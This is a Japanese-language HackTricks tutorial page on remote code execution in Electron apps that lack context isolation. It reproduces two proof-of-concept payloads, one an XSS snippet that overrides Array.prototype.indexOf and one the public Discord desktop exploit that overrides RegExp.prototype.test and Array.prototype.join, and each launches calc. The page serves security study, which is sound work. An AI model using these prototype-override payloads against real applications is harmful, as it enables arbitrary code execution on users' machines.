# Electron contextIsolation RCE via preload code

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有**してください。

</details>

## 例 1

[https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)からの例

このコードは、デフォルトのブラウザでhttp(s)リンクを開きます：

![](<../../../.gitbook/assets/image (375) (1) (1).png>)

`file:///C:/Windows/systemd32/calc.exe`のようなものを使用してcalcを実行することができますが、`SAFE_PROTOCOLS.indexOf`がこれを防いでいます。

したがって、攻撃者はXSSや任意のページナビゲーションを介してこのJSコードを注入することができます：
```html
<script>
Array.prototype.indexOf = function(){
return 1337;
}
</script>
```
呼び出し `SAFE_PROTOCOLS.indexOf` は常に1337を返すため、攻撃者は保護をバイパスしてcalcを実行できます。最終的なエクスプロイト：
```html
<script>
Array.prototype.indexOf = function(){
return 1337;
}
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```
以下は、許可を求めるプロンプトなしでプログラムを実行する他の方法についてのオリジナルスライドを確認してください。

どうやら、`file://127.0.0.1/electron/rce.jar` のようなものにアクセスしてコードをロードし実行する別の方法があるようです。

## 例 2: Discord アプリの RCE

[https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1) からの例

プリロードスクリプトをチェックしていると、Discord が `DiscordNative.nativeModules.requireModule('MODULE-NAME')` を介して呼び出すことができる許可されたモジュールをウェブページに公開する関数を露出していることがわかりました。\
ここでは、_child\_process_ モジュールのような RCE を直接使用できるモジュールは使用できませんでしたが、**JavaScript の組み込みメソッドをオーバーライドし、公開されたモジュールの実行に干渉することで RCE を達成できるコードを見つけました**。

以下はその PoC です。devTools から "_discord\_utils_" というモジュールで定義されている `getGPUDriverVersions` 関数を**呼び出す**ときに、**`RegExp.prototype.test` と `Array.prototype.join` をオーバーライドする**ことで、**calc** アプリケーションが **ポップアップする**ことを確認できました。
```javascript
RegExp.prototype.test=function(){
return false;
}
Array.prototype.join=function(){
return "calc";
}
DiscordNative.nativeModules.requireModule('discord_utils').getGPUDriverVersions();
```
```markdown
`getGPUDriverVersions` 関数は、以下のように "_execa_" ライブラリを使用してプログラムを実行しようとします:
```
```javascript
module.exports.getGPUDriverVersions = async () => {
if (process.platform !== 'win32') {
return {};
}

const result = {};
const nvidiaSmiPath = `${process.env['ProgramW6432']}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`;

try {
result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []));
} catch (e) {
result.nvidia = {error: e.toString()};
}

return result;
};
```
通常、_execa_ は `nvidiaSmiPath` 変数で指定された "_nvidia-smi.exe_" を実行しようとしますが、`RegExp.prototype.test` と `Array.prototype.join` がオーバーライドされたため、**引数が \_execa\_\_ の内部処理で "**_**calc**_**" に置き換えられます**。

具体的には、以下の二つの部分を変更することで引数が置き換えられます。

[https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36)

[https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L55](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L55)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) で AWS ハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks にあなたの会社を広告したい**、または **HackTricks を PDF でダウンロードしたい** 場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式の PEASS & HackTricks グッズ**](https://peass.creator-spring.com) を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションをチェックする
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) に**参加する**か、[**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) を **フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の github リポジトリに PR を提出して、あなたのハッキングのコツを **共有する**。

</details>
